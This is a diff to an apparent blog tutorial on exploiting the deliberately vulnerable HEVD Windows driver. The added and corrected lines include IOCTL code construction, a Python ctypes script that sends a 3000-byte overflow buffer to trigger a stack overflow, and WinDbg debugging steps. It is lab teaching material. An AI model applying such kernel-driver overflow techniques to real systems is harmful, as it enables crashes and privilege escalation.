@@ -107,7 +107,7 @@ We can also create IOCTL values from scratch with some Python code. To do that, 
 + METHOD_NEITHER = 0x3
 + FILE_ANY_ACCESS = 0x0
 
-From the [Primer](https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/#fnref:4) we know that wer have to move *Device Type* to the 16th bit, *Required Access* to the 14th bit, *Function Code* to 2nd and *Transfer Type* to the end:
+From the [Primer](https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/#fnref:4) we know that we have to move *Device Type* to the 16th bit, *Required Access* to the 14th bit, *Function Code* to 2nd and *Transfer Type* to the end:
 
 ```python
 ioctl = hex((0x22 << 16) | (0x0 << 14) | (0x800 << 2) | 0x3)
@@ -148,7 +148,7 @@ if (not hevd) or (hevd == -1):
 
 # malicious payload
 payload = "\x41" * 3000
-payload_size = len(buf)
+payload_size = len(payload)
 
 # send message to the device
 kernel32.DeviceIoControl(
@@ -158,14 +158,27 @@ kernel32.DeviceIoControl(
     payload_size,       
     None,
     0,
-    None,
-    byref(c_ulong(),
+    byref(c_ulong()),
     None
 )
-
 ```
 
+In WinDbg, in the debugger machine, we enable printing debug messages and put breakpoint at <code>TriggerBufferOverflowStack</code> function to see what happens when we execute above code.
 
+```c
+ed Kd_DEFAULT_Mask 8
+!sym noisy
+.reload /f *.*
+bp HEVD!TriggerBufferOverflowStack
+```
+
+If there are no debug messages printed in the WinDbg output, try to run below command on the debuggee:
+
+```c
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter" /v DEFAULT /t REG_DWORD /d 0xf
+```
+![BP triggered](/assets/img/windbg_bp_TriggerBufferOverflowStack.png)
+![Buffer Overflow](/assets/img/windbg_stackBO.png)
 
 ## <span class="myheader">References<span>
 
